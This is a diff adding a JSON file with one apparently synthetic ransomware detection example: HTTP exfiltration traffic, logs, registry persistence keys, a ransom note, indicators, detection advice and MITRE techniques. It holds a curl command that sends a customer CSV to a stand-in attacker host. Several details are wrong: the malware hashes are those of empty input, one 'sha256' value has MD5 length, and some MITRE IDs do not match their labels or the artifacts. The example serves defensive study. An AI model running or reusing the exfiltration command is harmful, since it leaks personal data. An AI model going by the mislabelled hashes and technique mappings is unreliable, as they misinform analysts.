@@ -1,0 +1,57 @@
+{
+  "examples": [
+    {
+      "scenario": "Double extortion ransomware attack involving exfiltration of sensitive customer PII from an enterprise network before encrypting files and threatening data leak.",
+      "technical_data": {
+        "network_exfiltration_http": {
+          "raw_http_request": "POST /upload.php HTTP/1.1\r\nHost: attacker-malicious-domain.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nContent-Type: application/octet-stream\r\nContent-Length: 524288\r\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=  \r\nConnection: keep-alive\r\n\r\n[Binary data stream containing exfiltrated .csv file of customer records]",
+          "raw_http_response": "HTTP/1.1 200 OK\r\nDate: Tue, 20 Jun 2023 15:03:22 GMT\r\nContent-Type: application/json\r\nContent-Length: 45\r\nConnection: keep-alive\r\n\r\n{\"status\":\"success\",\"message\":\"data received\"}"
+        },
+        "network_packet_capture_snippet": "Frame 12345: 554 bytes on wire (4432 bits), 554 bytes captured (4432 bits)\nEthernet II, Src: 00:0c:29:ab:cd:ef, Dst: 52:54:00:12:34:56\nInternet Protocol Version 4, Src: 10.10.15.15, Dst: 93.184.216.34\nTransmission Control Protocol, Src Port: 49278, Dst Port: 80, Seq: 12345, Ack: 67890, Len: 500\nHypertext Transfer Protocol\n    POST /upload.php HTTP/1.1\r\n    Host: attacker-malicious-domain.com\r\n    Content-Type: application/octet-stream\r\n    Authorization: Basic YWRtaW46cGFzc3dvcmQ=\r\n    Content-Length: 524288\r\n    \n    [Payload: Binary data stream (524288 bytes)]",
+        "firewall_logs": "Jun 20 15:03:22 fw01 kernel: IN=eth0 OUT=eth1 SRC=10.10.15.15 DST=93.184.216.34 LEN=554 TOS=0x00 PREC=0x00 TTL=128 ID=54321 DF PROTO=TCP SPT=49278 DPT=80 WINDOW=8192 RES=0x00 SYN URGP=0",
+        "endpoint_process_creation_log": "2023-06-20T15:02:45.123Z host-001 SecurityEvent: ProcessCreate: ProcessId=4532 ParentProcessId=1000 Image=C:\\Users\\victim\\AppData\\Local\\Temp\\ransomware.exe CommandLine=\"C:\\Users\\victim\\AppData\\Local\\Temp\\ransomware.exe --encrypt --target C:\\SensitiveData\"",
+        "file_hashes": {
+          "ransomware_executable": {
+            "md5": "d41d8cd98f00b204e9800998ecf8427e",
+            "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+          },
+          "exfiltrated_data_sample": {
+            "md5": "9e107d9d372bb6826bd81d3542a419d6",
+            "sha1": "2fd4e1c67a2d28fced849ee1bb76e7391b93eb12",
+            "sha256": "5d41402abc4b2a76b9719d911017c592"
+          }
+        },
+        "registry_artifacts": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater = 'C:\\Users\\victim\\AppData\\Local\\Temp\\ransomware.exe'",
+          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\RansomSvc = REG_DWORD 0x1 (auto-start malicious service)"
+        ],
+        "ransom_note_content": "Your files have been encrypted! To recover your data, pay 50 BTC to the following address within 72 hours or your stolen data will be published online.\nContact: decrypt-support@protonmail.com\n",
+        "exfiltration_tool_command": "curl -X POST http://attacker-malicious-domain.com/upload.php -H \"Authorization: Basic YWRtaW46cGFzc3dvcmQ=\" --data-binary @C:\\SensitiveData\\customers.csv"
+      },
+      "indicators": {
+        "suspicious_domain": "attacker-malicious-domain.com",
+        "ransomware_executable_hashes": {
+          "md5": "d41d8cd98f00b204e9800998ecf8427e"
+        },
+        "unusual_http_posts": "POST /upload.php with octet-stream content type and large binary payload",
+        "registry_persistence_keys": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\RansomSvc"
+        ],
+        "unusual_process_parenting": "ransomware.exe spawned by explorer.exe or other user process",
+        "exfiltration_activity": "Outbound connections to unknown IPs/domains on port 80/443 with large data uploads"
+      },
+      "detection_method": "Monitor for large outbound HTTP POST requests to unknown external domains, correlate with endpoint process creation logs showing unknown executables launching with encryption parameters, and detect persistence registry changes related to suspicious executables. Network DLP tools to alert on sensitive data patterns in outbound traffic. Use endpoint detection and response (EDR) to detect ransomware behaviors like mass file encryption and registry modifications.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1530 - Data from Network Shared Drive",
+        "T1560.001 - Archive Collected Data: Archive via Archive Utility",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1053 - Scheduled Task/Job (for persistence)",
+        "T1112 - Modify Registry"
+      ]
+    }
+  ]
+}
